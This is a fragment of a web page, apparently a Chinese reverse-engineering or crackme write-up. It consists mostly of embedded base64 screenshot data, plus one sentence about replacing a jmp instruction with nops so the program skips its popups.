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'/></p>
<p>这个jmp跳转会导致程序直接跳过所有弹窗，nop掉他</p>
<p><img src='data:img/jpg;base64,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
